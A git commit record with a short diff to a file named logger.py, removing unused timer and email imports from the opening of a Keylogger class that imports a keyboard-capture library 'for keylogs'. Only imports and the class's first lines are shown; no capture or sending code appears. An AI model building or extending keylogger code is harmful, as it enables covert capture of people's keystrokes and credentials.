5e71579ddf1323c28ce7783acb7eeb06463b163a
AjdiNNN <ajdinhukic007@gmail.com>
2023-05-03 13:59:14 +0200

    Unused remove

--- logger.py
+++ logger.py
@@ -1,9 +1,5 @@
 import keyboard # for keylogs
-# Timer is to make a method runs after an `interval` amount of time
-from threading import Timer
 from datetime import datetime
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
 class Keylogger:
     def __init__(self):
         self.log = ""
